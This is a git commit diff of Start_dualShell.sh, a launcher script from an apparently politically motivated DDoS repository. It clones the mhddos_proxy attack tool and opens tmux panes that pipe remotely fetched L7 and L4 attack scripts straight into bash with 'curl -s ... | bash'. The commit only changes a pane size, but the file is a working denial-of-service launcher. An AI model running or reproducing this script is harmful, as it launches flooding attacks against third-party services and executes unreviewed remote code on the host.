e3ecda0feeea625252955adbfaf42cb52ad94ea2
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-17 21:46:09 +0300

    Update Start_dualShell.sh

--- Start_dualShell.sh
+++ Start_dualShell.sh
@@ -11,6 +11,6 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 
-tmux split-window -v -p 100 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
+tmux split-window -v -p 99 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
 sleep 0.1
 tmux split-window -h -p 50 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4 | bash'
